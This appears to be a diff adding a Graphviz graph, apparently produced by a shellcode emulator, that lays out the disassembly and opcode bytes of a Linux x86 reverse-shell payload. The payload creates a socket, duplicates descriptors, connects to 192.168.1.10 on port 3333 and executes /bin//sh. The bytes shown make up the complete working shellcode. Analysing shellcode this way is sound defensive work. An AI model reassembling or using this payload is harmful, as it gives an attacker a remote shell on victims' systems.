@@ -1,0 +1,26 @@
+digraph G {
+	//rankdir=LR
+	node [fontname=Courier, labeljust=r];
+	 "0x8aed4f8" [shape=box, label = "0x00417000 31DB                            xor ebx,ebx\l0x00417002 F7E3                            mul ebx\l0x00417004 53                              push ebx\l0x00417005 43                              inc ebx\l0x00417006 53                              push ebx\l0x00417007 6A02                            push byte 0x2\l0x00417009 89E1                            mov ecx,esp\l0x0041700b B066                            mov al,0x66\l"]
+	 "0x8aed270" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041700d socket\l"]
+	 "0x8af0538" [shape=box, label = "0x0041700f 93                              xchg eax,ebx\l0x00417010 59                              pop ecx\l"]
+	 "0x8af0738" [shape=box, label = "0x00417011 B03F                            mov al,0x3f\l"]
+	 "0x8af0838" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417013 dup2\l"]
+	 "0x8af0910" [shape=box, label = "0x00417015 49                              dec ecx\l"]
+	 "0x8af0a10" [shape=box, label = "0x00417016 79F9                            jns 0xfffffffb\l"]
+	 "0x8af0b10" [shape=box, label = "0x00417018 68C0A8010A                      push dword 0xa01a8c0\l0x0041701d 6802000D05                      push dword 0x50d0002\l0x00417022 89E1                            mov ecx,esp\l0x00417024 B066                            mov al,0x66\l0x00417026 50                              push eax\l0x00417027 51                              push ecx\l0x00417028 53                              push ebx\l0x00417029 B303                            mov bl,0x3\l0x0041702b 89E1                            mov ecx,esp\l"]
+	 "0x8af1420" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041702d connect\l"]
+	 "0x8af1500" [shape=box, label = "0x0041702f 52                              push edx\l0x00417030 682F2F7368                      push dword 0x68732f2f\l0x00417035 682F62696E                      push dword 0x6e69622f\l0x0041703a 89E3                            mov ebx,esp\l0x0041703c 52                              push edx\l0x0041703d 53                              push ebx\l0x0041703e 89E1                            mov ecx,esp\l0x00417040 B00B                            mov al,0xb\l"]
+	 "0x8af1d10" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417042 execve\l"]
+	 "0x8aed4f8" -> "0x8aed270" [style = bold ]
+	 "0x8aed270" -> "0x8af0538" [style = bold ]
+	 "0x8af0538" -> "0x8af0738" [style = bold ]
+	 "0x8af0738" -> "0x8af0838" [style = bold, color=orange ]
+	 "0x8af0838" -> "0x8af0910" [style = bold, color=orange ]
+	 "0x8af0910" -> "0x8af0a10" [style = bold, color=orange ]
+	 "0x8af0a10" -> "0x8af0738" [style = bold, color=orange ]
+	 "0x8af0a10" -> "0x8af0b10" [style = bold ]
+	 "0x8af0b10" -> "0x8af1420" [style = bold ]
+	 "0x8af1420" -> "0x8af1500" [style = bold ]
+	 "0x8af1500" -> "0x8af1d10" [style = bold ]
+}
